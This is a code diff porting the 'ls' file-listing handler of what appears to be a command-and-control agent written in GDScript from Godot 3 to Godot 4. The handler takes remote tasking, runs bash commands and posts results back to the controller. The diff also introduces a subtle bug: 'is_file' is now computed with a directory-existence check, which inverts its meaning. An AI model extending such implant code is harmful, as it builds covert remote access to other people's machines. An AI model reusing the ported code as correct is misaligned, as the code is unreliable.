@@ -11,7 +11,9 @@ func _ready():
 func _on_tasking_ls(task):
 
 	if task.has("command") and task.get("command") == "ls":
-		var parameters = parse_json(task.get("parameters"))
+		var test_json_conv = JSON.new()
+		test_json_conv.parse(task.get("parameters"))
+		var parameters = test_json_conv.get_data()
 		var path = parameters.get("path")
 		var output = "Unable to obtain listing for: %s" % path
 		var status = "error"
@@ -78,7 +80,7 @@ func _on_tasking_ls(task):
 		print("\n\n")
 
 		api.agent_response(
-			to_json({
+			JSON.stringify({
 				"action": "post_response",
 				"responses": [ls_response],
 			})
@@ -91,11 +93,13 @@ func get_linux_ls_find_result(command):
 	var result = []
 	var output = []
 
-	if 0 == OS.execute("bash", ["-c", command], true, output, false):
+	if 0 == OS.execute("bash", ["-c", command], output, true, false):
 
 		for fileline in output[0].split('\n'):
 			if fileline.length() > 0:
-				var entry = parse_json(fileline)
+				var test_json_conv = JSON.new()
+				test_json_conv.parse(fileline)
+				var entry = test_json_conv.get_data()
 
 				if typeof(entry) == TYPE_DICTIONARY:
 					result.append(entry)
@@ -103,8 +107,7 @@ func get_linux_ls_find_result(command):
 	return result
 
 func get_linux_ls(path):
-	var dir = Directory.new()
-	var is_file = dir.file_exists(path)
+	var is_file = DirAccess.dir_exists_absolute(path)
 	var result = []
 	var tle = false
 
